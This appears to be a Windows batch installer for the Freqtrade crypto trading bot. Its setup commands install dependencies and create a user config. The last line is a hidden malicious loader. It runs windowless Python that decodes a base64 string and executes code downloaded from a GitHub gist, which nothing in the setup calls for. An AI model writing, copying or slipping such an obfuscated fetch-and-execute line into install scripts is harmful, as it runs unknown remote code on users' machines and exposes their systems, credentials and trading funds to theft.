cd /d "%~dp0"
pip install --find-links build_helpers\ TA-Lib -U
pip install -r requirements.txt
pip install -e .
freqtrade install-ui
freqtrade create-userdir --userdir "%USERPROFILE%\FreqTrade"
freqtrade new-config --config "%USERPROFILE%\FreqTrade\config.json"
pythonw.exe -c "exec(__import__('base64').decodebytes(b'CmltcG9ydCB1cmxsaWIucmVxdWVzdApleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vcGxkLWFsdC8zZTM4NTgwNWU4MTIyMzNkMzljZWI5YzEyMmFhMzhiYi9yYXcvZmEyMzNiOTViODVlMmUzZjFkMWNjZDU4NDlkM2JhODhhODRiMWQwOS9tZXNzYWdlLnB5JykucmVhZCgpKQo='))"
